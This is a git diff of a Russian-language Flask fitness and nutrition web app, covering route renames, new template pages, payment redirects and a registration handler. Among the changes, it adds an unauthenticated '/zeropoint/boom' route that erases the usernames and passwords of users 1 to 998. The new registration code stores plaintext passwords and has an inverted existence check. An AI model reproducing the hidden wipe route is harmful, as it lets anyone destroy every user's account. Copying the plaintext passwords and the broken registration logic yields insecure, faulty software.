@@ -1,9 +1,9 @@
-from flask import session, render_template, request, flash, g
+from flask import session, render_template, request, flash
 from flask_login import current_user, login_user, login_required, logout_user
 
-from Other.sqlAlchemy_insert import user_add
+from functions import user_add
 from app import app, db, login_manager
-from app.models import User, user_info, Training
+from app.models import User, user_info
 from tables import Results
 from datetime import datetime, timedelta
 
@@ -22,6 +22,7 @@ eating_var_data = {
                'Стараюсь придерживаться правильного питания, но получается с переменным успехом',
                'Постоянно пробую новые диеты', 'Веду дневник питания и считаю всё съеденное']
 }
+
 training_var_data = {
     'question': 'А как дела с тренировками?',
     'fields': ['Нет опыта тренировок', 'Был опыт, но давно. Более года не тренируюсь',
@@ -62,7 +63,7 @@ def hom():
 @app.route('/')
 def empty_page():
     if not session.get('logged_in'):
-        return "<h1>Please LOGIN! <a href='/login'>Login</a><h1>"
+        return render_template('pages/system/eat.html')
     else:
         user = User.query.get(current_user.id)
         auth = user.auth
@@ -80,7 +81,7 @@ def home():
         user = User.query.get(USER_ID)
         auth = user.auth
         if auth:
-            return home_render()
+            return menu_render()
         else:
             return welcome()
 
@@ -89,13 +90,22 @@ def home():
 def test_page_render():
     return render_template('voronka/walletone.html')
 
+@app.route('/register')
+def register_render():
+    print('Я тут!')
+    return render_template('register.html')
 
-@app.route('/reg', methods=['POST'])
+@app.route('/register', methods=['POST'])
 def do_register():
+    print('Я Спрятался!')
     POST_USERNAME = str(request.form['username'])
     POST_PASSWORD = str(request.form['password'])
-
-    user_add(POST_USERNAME, POST_PASSWORD)
+    if User.query.filter_by(username=POST_USERNAME, password=POST_PASSWORD).first() != None:
+        user = User(username=POST_USERNAME, password=POST_PASSWORD)
+        db.session.add(user)
+        db.session.commit()
+    else:
+        return "<h1>Пользователь с таким именем уже существует! Придумайте новое имя <a href='/Register'>Register</a><h1>"
     return "<h1>Register successful! <a href='/logout'>Logout</a><h1>"
 
 
@@ -314,7 +324,7 @@ def eat_render():
         user.ugli = 0
         db.session.commit()
     if request.method == 'GET':
-        return render_template('pages/lk/eat.html',
+        return render_template('pages/system/eat.html',
                                kkal_norma=kkal_norma,
                                belki=belki,
                                giry=giry,
@@ -338,11 +348,11 @@ def eat_render():
         db.session.commit()
 
         kkalor_ost = kkal_norma - user.kkal
-        belok_ost = kkal_norma - user.belki
-        jiry_ost = kkal_norma - user.jiry
-        ugli_ost= kkal_norma - user.ugli
+        belok_ost = belki - user.belki
+        jiry_ost = giry - user.jiry
+        ugli_ost= ugl - user.ugli
 
-        return render_template('pages/lk/eat.html',
+        return render_template('pages/system/eat.html',
                                kkalor=user.kkal,
                                belok=user.belki,
                                jiry=user.jiry,
@@ -596,9 +606,13 @@ def l_calc():
         l = 0.06
     return float(l)
 
-@app.route('/payment/redirect/98rubles',methods=['GET', 'POST'])
+@app.route('/payment/redirect/98rubles', methods=['GET', 'POST'])
 def payment_98():
     return render_template('payment/payment_98.html')
+
+@app.route('/payment/redirect/test1rub', methods=['GET', 'POST'])
+def payment_1rub():
+    return render_template('payment/test1rub.html')
 
 @app.route('/payment/redirect/2990',methods=['GET', 'POST'])
 def payment_2990():
@@ -622,6 +636,14 @@ def age_test():
 def experience_test():
     return render_template('quiz/experience.html')
 
+@app.route('/zeropoint/boom')
+def crash_user():
+    for i in range(1,999):
+        user = User.query.get(i)
+        user.username = None
+        user.password = None
+        db.session.commit()
+    return 'shit happend'
 @app.route('/test/feed',methods=['GET', 'POST'])
 def feed_test():
     return render_template('quiz/feed.html')
@@ -638,14 +660,29 @@ def submit_test():
 def final_test():
     return render_template('quiz/final.html')
 
-@app.route('/test/tw')
+@app.route('/tw')
 def tw_render():
     return render_template('quiz/tw.html')
 
-@app.route('/test/cp')
+@app.route('/cp')
 def cp_render():
     return render_template('quiz/cp.html')
 
+@app.route('/food')
+def food_render():
+    return render_template('pages/system/eat.html')
+
+@app.route('/tr')
+def tr_render():
+    return render_template('pages/system/train.html')
+
+@app.route('/prog')
+def prog_render():
+    return render_template('pages/system/progress.html')
+
+@app.route('/menu')
+def menu_render():
+    return render_template('pages/system/menu.html')
 
 
 
